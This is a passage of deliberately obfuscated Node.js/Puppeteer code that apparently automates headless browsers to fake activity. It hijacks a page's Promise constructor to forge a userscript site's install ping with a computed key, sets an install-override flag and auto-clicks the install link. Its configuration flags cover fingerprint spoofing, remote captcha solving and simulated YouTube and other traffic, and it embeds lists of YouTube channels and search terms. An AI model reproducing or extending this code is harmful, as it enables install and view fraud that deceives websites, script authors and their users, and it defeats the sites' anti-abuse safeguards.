              for (J = 0xc6c * -0x3 + -0x61 * -0x49 + 0x63 * 0x19; J < 0x1 * 0x1b7 + -0x614 + 0x4ad; ++J)
                K = Q[J - (0x1ff * -0xd + -0xd62 + -0x13ac * -0x2)] ^ Q[J - (-0x22e3 + 0x1 * -0x14d5 + -0x6f8 * -0x8)] ^ Q[J - (0x20e8 + -0x22ce + 0x1f4)] ^ Q[J - (-0x28e * 0x6 + 0x1 * -0xa09 + 0x196d * 0x1)], Q[J] = K << 0x334 + -0x1c3 + -0x170 | K >>> -0x4a * -0x62 + -0x214e + 0x519;
              for (J = -0x3 * -0x4eb + -0x143d + 0x57c; J < -0x1 * -0x251 + 0x463 * 0x3 + -0xf66; J += -0x83f * -0x2 + -0x8b4 * 0x1 + -0x7c5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc46 + 0x1984 + 0x5 * -0x2a5 | L >>> -0x90d + 0x4 * 0x882 + -0x31c * 0x8) + (M & N | ~M & O) + P + (-0x15f618ad * 0x2 + 0x5248 * -0x1203d + 0xe313461b) + Q[J] << 0x1 * 0x1463 + 0x24d4 + 0x97 * -0x61) << 0x35 * 0x71 + 0x247c + 0x4fd * -0xc | P >>> 0x4f * 0xb + -0xa * 0xdd + -0x72 * -0xc) + (L & (M = M << -0x4f * -0x3 + 0x17b * -0xd + 0x1270 | M >>> 0x3 * -0x84e + 0x20c1 + -0x1 * 0x7d5) | ~L & N) + O + (-0x1 * 0x5f616d07 + 0x1a432d70 + 0x9fa0b930) + Q[J + (0x276 + 0x2 * -0x1f9 + 0x17d * 0x1)] << -0xd62 + -0xfb3 + 0x1d15) << 0x2328 + 0x2575 * -0x1 + 0x252 | O >>> -0x223e + 0x3 * 0x46d + 0x6 * 0x383) + (P & (L = L << -0xb * -0x8a + 0x1c8e + 0x2 * -0x112f | L >>> 0x111f + -0x1 * -0x1417 + -0x2534) | ~P & M) + N + (-0x4259d71d + -0x5311695f + 0xefedba15) + Q[J + (0x23a2 + 0xae9 + 0x273 * -0x13)] << -0xbfc * -0x1 + -0x6 * -0x157 + 0x1 * -0x1406) << 0x457 * -0x1 + -0x5a6 + 0xa02 | N >>> -0x1de2 + -0x886 * -0x1 + 0x311 * 0x7) + (O & (P = P << 0x6f6 + 0x1540 + -0x1c18 | P >>> 0x1 * 0xc41 + -0x2141 * 0x1 + 0x1502 * 0x1) | ~O & L) + M + (-0x429a6975 * 0x2 + -0x2e8eaaa6 + 0x5a175263 * 0x3) + Q[J + (0x20a5 + -0x1 * -0x89b + -0x293d)] << -0x155a + -0x193f * 0x1 + 0x2e99) << -0x563 * -0x5 + 0x192d + -0x771 * 0x7 | M >>> -0x142d + -0x5 * 0x362 + 0x2532) + (N & (O = O << -0x2 * -0x2fa + 0x1843 + -0x1e19 | O >>> 0x13c7 + 0x7db + -0x4 * 0x6e8) | ~N & P) + L + (0x1dbe * 0x435ed + 0xa91eb3ea + -0xd * 0xfae2953) + Q[J + (-0x58 * 0x1a + 0x1707 + -0xe13)] << 0x26e4 + 0x546 + -0x2c2a * 0x1, N = N << -0x1459 * -0x1 + 0x1cd4 + -0x310f | N >>> 0x46 * -0x7f + 0x74 * -0x3 + 0x6 * 0x604;
              for (; J < -0x12e * -0x1 + -0xe2 * 0x4 + 0x282; J += -0x1484 + 0x1a4 * 0x5 + 0x1 * 0xc55)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x8ea * 0x2 + 0x957 + 0xb * 0xc6 | L >>> 0x116f + 0x56b * -0x1 + 0x1 * -0xbe9) + (M ^ N ^ O) + P + (-0x157e227 * -0xa1 + 0xc8385681 + -0x131a3a567) + Q[J] << -0xef3 * 0x1 + 0x1ccf + -0x2 * 0x6ee) << 0x24cd + 0x22ad + -0x1 * 0x4775 | P >>> 0xf68 + -0x1 * 0x899 + -0x34 * 0x21) + (L ^ (M = M << 0x95 * -0x8 + 0x40 * 0x8 + 0x2c6 * 0x1 | M >>> -0x208 * -0x4 + -0x9b5 + 0x197) ^ N) + O + (-0xb367d1f9 + -0xe3 * 0x6cf7f1 + 0x182e1984d) + Q[J + (-0xd6 * 0x5 + 0x1170 + -0xd41)] << -0x12dd + -0x67f + 0xcae * 0x2) << -0xb32 * 0x3 + 0x3f + 0x215c | O >>> -0x193 * 0xb + 0x25 * -0x86 + 0x24ca) + (P ^ (L = L << -0x1223 * 0x2 + 0x1b83 + 0x1 * 0x8e1 | L >>> 0x14aa + 0x1 * 0xcbb + -0x2163) ^ M) + N + (-0x7328adea + 0x1 * -0x8a54d68e + 0x16c577019) + Q[J + (0x1590 + 0x5d * 0x43 + -0x2de5)] << -0x1fc1 * 0x1 + -0x1cba + 0x3c7b) << 0x4 * 0x503 + 0x1f54 + -0x335b | N >>> 0x2 * 0xfc1 + -0x3 * -0x40e + -0x1 * 0x2b91) + (O ^ (P = P << -0x1744 + 0x1bce + -0x46c | P >>> -0xc29 + -0x23ea + 0x3015) ^ L) + M + (0x37 * -0x145284b + -0x2bb970be + 0xe06f047c) + Q[J + (-0x1b12 + 0x235 * -0x4 + -0x13d * -0x1d)] << -0x22ba + 0x24a4 + 0x23 * -0xe) << -0x1e5e * 0x1 + -0x2 * 0xa3f + -0xa2d * -0x5 | M >>> 0x1ec + -0xd47 + 0x1e9 * 0x6) + (N ^ (O = O << -0x1 * 0x25a5 + -0x3 * -0x9c6 + 0x871 | O >>> -0x4 * -0x7fa + 0x1df0 + -0x3dd6) ^ P) + L + (-0x3 * 0x41f6ce23 + -0xcc917723 + 0x2014fcd2d) + Q[J + (0x7 * 0x30b + -0x1 * -0x77f + 0x3 * -0x998)] << 0x11b * 0x9 + 0x3 * -0x92f + 0x2ef * 0x6, N = N << 0x8 * 0x19b + -0x3b * -0x49 + 0x5e9 * -0x5 | N >>> -0x4dd + 0x25a9 + 0x3 * -0xaee;
              for (; J < 0x1100 + -0x10e8 + 0x24; J += 0x2 * -0x120b + -0x18e8 + -0x3d03 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xdba + 0x1185 + -0x3c6 | L >>> -0x1 * 0x4f + 0x2 * -0x1377 + 0x2758) + (M & N | M & O | N & O) + P - (0x3387b09 * 0x35 + 0x637f499 + -0x40052a52) + Q[J] << 0x11e7 + -0x1ac3 + 0x8dc) << -0x1ed + 0x1466 + -0x1274 | P >>> -0x1 * -0x4ba + 0x2582 + 0x2a21 * -0x1) + (L & (M = M << 0x7 * -0x133 + 0x1d5c + -0x14d9 | M >>> -0x1d7 + -0x1382 + 0x155b) | L & N | M & N) + O - (0xc7c125 * -0x10f + 0x2513a167 * 0x1 + 0x8caee * 0x20ac) + Q[J + (-0x13ff + -0x1a0e + 0xf * 0x312)] << 0x8 * 0x3da + 0x2111 + -0x154b * 0x3) << 0x2 * 0x72a + -0x29 * 0x59 + 0x1 * -0xe | O >>> 0xa67 * 0x2 + 0x1 * 0x5ab + -0x1a5e) + (P & (L = L << -0x1 * -0x184a + -0xc45 + -0xbe7 * 0x1 | L >>> 0x243f * 0x1 + 0x1a55 + -0x1 * 0x3e92) | P & M | L & M) + N - (-0x12df76a5 + -0x1d85bd02 + 0x5 * 0x2041e48f) + Q[J + (0x31 * 0x92 + -0x13eb * -0x1 + -0x2fdb * 0x1)] << 0x18b1 * 0x1 + -0x3 * 0xbff + 0x4 * 0x2d3) << 0x3 * -0x9d5 + 0x50d + 0x1877 | N >>> 0x1a18 + 0x1af4 + -0x1 * 0x34f1) + (O & (P = P << -0x1 * 0x9de + 0x17c3 + -0xdc7 | P >>> 0x294 + -0x193d + -0x7 * -0x33d) | O & L | P & L) + M - (-0x14492703 + -0x9449b493 + 0x119771eba) + Q[J + (-0x44 * -0x8b + 0x2196 + -0x467f * 0x1)] << 0xf2a * 0x1 + -0x161c + 0x6f2) << 0x228a + 0x25d3 * -0x1 + 0x11a * 0x3 | M >>> 0x66 * 0x5c + -0x2 * 0x7bd + 0x19f * -0xd) + (N & (O = O << 0x309 + -0x1eb4 + 0x1bc9 | O >>> -0x627 + -0x21c + 0x845) | N & P | O & P) + L - (-0x86233202 + 0x1 * 0xcf11c17c + -0x2e41 * -0xdd2a) + Q[J + (-0x231b + -0x154f + 0x386e)] << 0x1ede + 0x337 * 0x2 + 0x1 * -0x254c, N = N << 0xf * 0x15 + 0x12c + -0x249 | N >>> -0x3a9 + -0xd94 + -0x373 * -0x5;
              for (; J < -0x8c + 0x53f + -0x463; J += -0x10d * -0x25 + 0x3 * 0xc25 + 0x5 * -0xf0f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x228 * 0x9 + -0x1c06 + 0x2f73 | L >>> 0xe5 * 0x26 + -0x9 * 0x84 + -0x1d3f * 0x1) + (M ^ N ^ O) + P - (-0x11507b0 * 0x38 + 0x1e0e3 * -0x5ab + 0x17f5 * 0x5363f) + Q[J] << 0x2 * -0x1b9 + 0x24e4 + -0xb26 * 0x3) << -0xd * 0xe5 + -0x4f3 + -0x25f * -0x7 | P >>> -0x867 + -0x5c * -0x26 + 0x526 * -0x1) + (L ^ (M = M << -0x61 * 0x25 + 0x3 * 0x659 + -0x274 * 0x2 | M >>> 0xb * -0x6 + -0x7f * 0x4 + 0x240) ^ N) + O - (-0x1 * 0x3eb1d318 + -0x533cb874 + -0x1c81af1a * -0x7) + Q[J + (-0x10ea + 0x27f + 0xe6c)] << -0x1bab + 0x2043 + 0x3 * -0x188) << -0x62 * -0xb + -0x1945 + -0x1 * -0x1514 | O >>> -0x1 * 0x9c7 + -0x4 * 0xa7 + 0x215 * 0x6) + (P ^ (L = L << -0x1115 + 0xa1f + 0x714 | L >>> -0xdb6 + -0x2 * -0x3 + 0xdb2) ^ M) + N - (0x12e2b597 + 0x1bd8dddb * -0x1 + 0x3e93666e) + Q[J + (-0x11b0 + -0xd32 + 0x1 * 0x1ee4)] << -0x3 * -0x75d + 0x2 * -0x653 + -0x971) << 0x6f1 + 0x267f + -0xb * 0x421 | N >>> -0xbe8 * -0x3 + 0xe7 * 0x3 + -0xa * 0x3d5) + (O ^ (P = P << -0x1 * 0x644 + -0xa87 + 0x27 * 0x6f | P >>> 0x23ec + 0x1cb8 + -0x40a2) ^ L) + M - (0x1 * -0xe6d5521 + 0x328e5a99 + 0x117c38b2) + Q[J + (0x1a4c + 0x1c9 + 0x1 * -0x1c12)] << -0x248a + -0x14d4 + 0x395e) << 0x1903 + -0x7d4 + -0x112a * 0x1 | M >>> 0x140 + -0x2280 + 0x215b) + (N ^ (O = O << -0x1138 + -0x122d + 0x2383 | O >>> 0xa0e + 0x1881 + -0x228d) ^ P) + L - (0x58da0a4c + 0xfb * -0x5a68e5 + 0x35680c65) + Q[J + (-0x8b * 0x15 + -0x86b + 0x2 * 0x9eb)] << 0x16f4 + -0xe77 * 0x1 + 0x1 * -0x87d, N = N << -0x825 * -0x4 + -0x1 * 0x1dde + -0x298 | N >>> 0x9c * -0x20 + 0x1 * 0x1220 + 0x162;
              this['h0'] = this['h0'] + L << -0x1fa2 + 0x1b55 + 0x44d, this['h1'] = this['h1'] + M << 0xd5 * -0x21 + -0xa6d + 0x25e2, this['h2'] = this['h2'] + N << 0x1139 * 0x1 + 0x2d2 + -0x140b, this['h3'] = this['h3'] + O << -0x136d + 0x2038 + -0xccb, this['h4'] = this['h4'] + P << -0x5fc * 0x4 + 0x19d * 0x5 + 0x11 * 0xef;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x47b * 0x1 + -0x51a + 0x3 * 0x33b & 0x5ae * -0x1 + 0x2709 + 0x214c * -0x1] + w[J >> 0x392 * 0x3 + -0x60 * 0x5 + -0x8be & 0x1e8f + 0x132b + -0x31ab] + w[J >> -0x4f9 + 0x7d3 + -0x47 * 0xa & 0x27 * -0xe9 + -0xd1d + 0x30ab] + w[J >> -0x5fd * 0x3 + -0x1 * 0x1ec1 + -0x1864 * -0x2 & -0x2006 + 0x4b * 0x3e + -0x7 * -0x1fd] + w[J >> -0x1368 + 0x59 * -0x40 + 0x29b4 & 0x1b7d * 0x1 + -0x18dd + -0x1 * 0x291] + w[J >> 0xabf + 0x1582 + -0x1 * 0x2039 & -0x16da + -0xcd + 0x17b6] + w[J >> -0x2d1 + 0xa36 + -0x761 * 0x1 & 0x222b + 0xcd3 + -0x2eef] + w[-0x1993 * -0x1 + -0x10b6 + -0x17 * 0x62 & J] + w[K >> 0x1 * 0xb99 + 0x197d + -0x2 * 0x127d & 0x1 * 0x1b16 + -0x775 + 0x6 * -0x343] + w[K >> 0x1b59 * 0x1 + 0x3 * -0xbbf + 0x7fc & -0x155f + 0x1d2 + 0x5 * 0x3ec] + w[K >> 0x1799 * -0x1 + -0x1ad1 + -0x2e * -0x119 & 0x17 * 0x71 + -0x8e1 * 0x1 + 0x1 * -0x137] + w[K >> -0x9 * 0x2c5 + -0x2012 + 0x390f & 0x11f3 + 0x1f7f * 0x1 + -0x3163] + w[K >> -0x1 * 0x12f8 + 0x1e5c + 0x1e4 * -0x6 & 0x1ff8 + 0xf5 * 0x3 + -0x22c8] + w[K >> -0x19 * 0xdf + -0xac0 * -0x1 + -0x1 * -0xb0f & -0x1 * -0x248e + 0x7d3 * 0x3 + -0x4c * 0xca] + w[K >> -0x2bb * -0xa + 0x8f * 0x2b + 0x47 * -0xb9 & -0xc * -0x2bf + 0x1 * -0x1e77 + -0x26e] + w[-0xb * -0xcb + -0x651 + 0x259 * -0x1 & K] + w[L >> 0x24cf + -0xe87 * 0x2 + -0x7a5 & 0x869 * 0x2 + 0x3 * 0x9eb + -0xe5 * 0x34] + w[L >> -0x5 * -0x3eb + 0x251 * -0x10 + 0x1 * 0x1191 & -0x4f4 + -0x1ef1 * 0x1 + -0x11fa * -0x2] + w[L >> -0x19 * -0x81 + -0x1 * 0xbef + -0x96 & 0x1bdb + 0x6a * 0x8 + -0x1f1c] + w[L >> -0x7ed + 0x4 * 0x16c + 0x24d & 0x11 * 0xbf + 0x1 * -0x93 + 0x1 * -0xc0d] + w[L >> -0x999 + 0x2000 + -0x165b & 0x11 * 0xda + -0x22d1 * 0x1 + 0xe * 0x175] + w[L >> 0x3 * 0x83e + 0x1609 + -0x2ebb & 0x1720 + -0xf6a + -0x3 * 0x28d] + w[L >> 0x1a83 + 0x666 * 0x2 + -0x1df * 0x15 & 0x8 * 0x2ed + -0x1 * 0x7c1 + 0x2 * -0x7cc] + w[0x1 * -0x2267 + 0x1 * 0x20e3 + 0x1f * 0xd & L] + w[M >> 0x1 * -0x1816 + -0x153b + 0x2d6d & -0xd6f + -0x678 + 0x13f6] + w[M >> -0x100d + 0x1 * 0xbf5 + -0x8 * -0x86 & -0x202f + 0x1b13 + 0x52b] + w[M >> -0x2 * -0x12ab + 0x1b4b + 0x5 * -0xce9 & -0x653 * -0x2 + 0x1 * 0xa01 + -0x4 * 0x5a6] + w[M >> 0x1c5 * -0xd + -0x390 + 0x1aa1 & -0x133 * -0x1d + -0x308 + -0x1fb0] + w[M >> -0xc0 * -0x24 + -0x1 * -0xe8d + 0x7d * -0x55 & 0x1 * -0x3b1 + -0x1fd5 * -0x1 + -0x1c15] + w[M >> 0x123e + 0x1b9 + -0xbd * 0x1b & 0x2455 * -0x1 + 0xbb5 + -0x59 * -0x47] + w[M >> -0x13 * -0x17b + -0xa71 + 0x3a * -0x4e & -0x150e + 0x1c4a + 0xa7 * -0xb] + w[0x4 * 0x42d + 0x204f * -0x1 + 0xfaa & M] + w[N >> -0x2123 + -0x6a0 + -0x27df * -0x1 & -0x551 + -0x20 * -0x2 + 0x520] + w[N >> 0x6f * 0xf + -0x18ab + 0x1242 & 0xd * -0xa4 + 0x1 * 0x2117 + -0x18b4] + w[N >> -0x111b * -0x1 + 0x23c3 + -0x3a * 0xe9 & -0x172f + 0x10b7 + 0x687] + w[N >> -0x73f * -0x5 + -0x37 * 0x9b + -0x2de & -0x7f7 * -0x1 + 0x59c * 0x1 + -0xd84] + w[N >> -0x149 * 0x10 + 0x18d * -0x18 + 0x39d4 & -0x31f * -0x8 + 0x1 * 0x3ad + -0x2 * 0xe4b] + w[N >> -0x11dd + 0xf9 * 0xd + 0x2a * 0x20 & -0x1acb + -0xf5 * -0x19 + 0x2ed] + w[N >> -0x1f0d * -0x1 + -0x623 * -0x5 + 0x1edc * -0x2 & -0x36e * 0x5 + -0xb1a + 0x1c4f] + w[-0x6e1 + 0x1b4 * -0x15 + 0x2ab4 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x14a0 + 0x382 * 0x5 + -0x2612 & -0x176c + -0xde9 + 0x2654,
                J >> -0xf5e + -0xfaa + 0x1f18 & -0x1 * -0x1cb5 + -0x1662 + -0x554,
                J >> 0xb * 0xe3 + 0xd * 0x277 + 0xc6 * -0x36 & 0x73 * -0x3d + -0xd0 + 0x1 * 0x1d36,
                -0x1b90 + 0x2548 + 0xcb * -0xb & J,
                K >> -0x177a + 0x3f5 * -0x9 + 0x6d * 0x8b & 0x1f0 * 0xa + 0x162d + -0x288e,
                K >> -0x13ac + -0x12c0 + 0x267c & -0x9 * 0x29 + -0x19f4 + 0x1c64,
                K >> 0xac6 + -0x9a2 + -0x11c & -0x1 * 0xa29 + 0x197c + 0x83 * -0x1c,
                -0x44 * -0x6f + 0x926 * -0x2 + 0x1 * -0xa31 & K,
                L >> 0x24ea + -0x3 * 0x6ba + -0x10a4 & 0x3 * 0xc1b + 0x2670 + -0x49c2,
                L >> -0x89 * 0x11 + 0x1 * -0x17bb + 0x20e4 & 0x96d + -0x547 + 0x10d * -0x3,
                L >> 0x208b * 0x1 + -0x1 * 0xd79 + 0x1 * -0x130a & -0x1f51 + -0x17ac + 0x37fc * 0x1,
                -0x5bb + 0x7b * -0x29 + 0x1a6d & L,
                M >> -0x2165 + -0x11e8 + 0x3365 & 0x3 * -0x28d + -0x22f * 0x7 + 0x22d * 0xb,
                M >> -0x70d + -0x6af * -0x5 + -0x5b * 0x4a & 0x1 * 0x1115 + 0xd8d + -0x1b * 0x119,
                M >> -0x14ac * 0x1 + 0xf61 + -0x553 * -0x1 & 0x3 * 0x7d8 + -0x1df5 * -0x1 + -0x347e,
                0x3b3 * 0x5 + -0xadf + -0x6a1 & M,
                N >> -0x1628 + 0xa77 + 0xbc9 & 0x579 + -0x930 + 0x4b6,
                N >> -0x20f * 0x1 + -0x1 * -0x22ca + 0x20ab * -0x1 & 0x20 * 0xc5 + 0xba0 * 0x1 + -0x2341,
                N >> -0x1cc8 * -0x1 + 0xdc * -0x18 + -0x820 & -0x1 * 0x4eb + 0x17e8 + -0x292 * 0x7,
                0x1 * -0x210d + 0x672 + 0x1b9a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x6b * -0x9 + -0x201e + 0x23f5), (K = new DataView(J))['setUint32'](-0x238e + -0x2 * -0x7e2 + -0x1 * -0x13ca, this['h0']), K['setUint32'](-0xc37 * -0x1 + -0x9e1 * -0x2 + 0x1 * -0x1ff5, this['h1']), K['setUint32'](-0xd8a * -0x2 + -0x18b4 + 0x4b * -0x8, this['h2']), K['setUint32'](0x915 + 0x23e + -0xb47, this['h3']), K['setUint32'](0x22e1 + 0x7e4 + -0x1d * 0x179, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + Y(0x2, '1hgp'), '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1e7b + 0x5 * -0x57 + 0x202e];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x6c + 0x264d * -0x1 + 0x17 * 0x1af;
            J[0xf98 + -0xfd4 * 0x1 + 0x3c * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x542 + -0x256d * 0x1 + 0x2aaf] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * -0x20c7 + 0x1522 + 0x2 * 0x5d3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xe * 0xef + -0x6 * 0x32b + 0x2015;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x403 * -0x1 + 0x1d14 + -0x1 * 0x1b3b), Promise['resolve'](-0x551 + 0x5d8 * -0x6 + 0x2862);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x25f7 + -0x13a7 + -0x1250; j < -0x2570 + 0x1214 + 0x135d * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x1 * 0x3607 + 0x3775 + -0x2b6 * -0xb + (-0xaa * -0x25 + 0x403 * 0x6 + -0x24ec) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x21b5 + -0x26d8 + -0x526 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const br = [
    'lxnLCMLLCY10Aa',
    'B3bLCI1YB2fKBq',
    'WOv+yW',
    'document.d',
    'zs8Q',
    'z290BW',
    'rCo0WRfHW6lcHmovW5xcVmkw',
    'gYRdLcldOCkmDgZdKNG',
    'rg/en/scri',
    'zxiUAw8UlIKSxW',
    'WRqvpWvUvCoaW7lcRt4',
    'W7f0xHq8eCkbW6ZdTxe',
    'DgfNtMfTzq',
    'CMfUzg9T',
    'DZZcMGq',
    'WQpcIahcR39CW40PWO8g',
    'AwDUzwqTzxHJAa',
    'https://gr',
    'versions',
    'jNv0Bv9Jyw1Wyq',
    'z2v0rwXLBwvUDa',
    'passer,_Ad',
    'WQRdMmohbmoBCrlcTSkYzW',
    'Bw9VlMLVigHHyW',
    'CMCVzw4VC2nYAq',
    'AfOvACo8aq',
    'https://me',
    'constructo',
    'DcbYzwfJDcX3Aa',
    'length',
    'WPFcQhlcOCo/dbqnWRtcVW'
  ];
  a = function() {
    return br;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x177f + 0xd43 + 0xa3c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xd * -0x196 + 0x941 + -0x1ddf);
    let h = e[f];
    if (b['SfoBZe'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x6ce + -0xf9d * -0x1 + -0x8cf * 0x1, s, t, u = -0x7 * 0x47f + 0x139a * 0x1 + 0xbdf; t = n['charAt'](u++); ~t && (s = r % (-0x1b8b + 0x318 + 0x1877) ? s * (0x432 * 0x9 + 0x2115 + -0x4697) + t : t, r++ % (0x61 * -0x1d + -0x1668 * 0x1 + -0x3 * -0xb23)) ? p += String['fromCharCode'](-0x1807 * 0x1 + 0xb02 * 0x3 + -0x800 & s >> (-(0x5a7 * 0x5 + -0xef0 + -0x7 * 0x1e7) * r & 0x136d + 0xd67 + -0x20ce)) : 0x19ca * -0x1 + 0x1d31 * -0x1 + -0x233 * -0x19) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1b14 * -0x1 + -0x15ff + -0x515, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1054 + -0x13c8 + 0x384))['slice'](-(0xfc + 0x3 * 0xc73 + -0x1 * 0x2653));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1f * -0x13 + 0x1065 + -0xe18,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x34 * -0x7c + 0x756 + 0x11da; u < -0x3 * 0x6af + 0x3 * -0xd7 + -0x1af * -0xe; u++) {
          p[u] = u;
        }
        for (u = 0x1793 + -0x19 + -0x1 * 0x177a; u < -0x3d5 + -0x880 * 0x1 + 0xd55; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1d * -0x130 + 0x24 * -0xc1 + 0xfa5 * 0x4), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1bee + 0x1910 + -0x34fe, q = -0x238c + 0x25be + -0x119 * 0x2;
        for (let v = -0xd42 * -0x2 + 0x8f0 + -0x8dd * 0x4; v < n['length']; v++) {
          u = (u + (-0x84f + 0x21de + -0x198e)) % (0xee3 + 0x1385 + -0x2168), q = (q + p[u]) % (0x43d + 0x15a6 + 0x18e3 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1e0 + 0x355 * -0x3 + 0x91f)]);
        }
        return t;
      };
      b['tbUbcH'] = m, c = arguments, b['SfoBZe'] = !![];
    }
    const j = e[-0x172 * 0x7 + 0x1bde + -0x11c0],
      k = f + j,
      l = c[k];
    return !l ? (b['alBvny'] === undefined && (b['alBvny'] = !![]), h = b['tbUbcH'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + Z(0x17) + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + 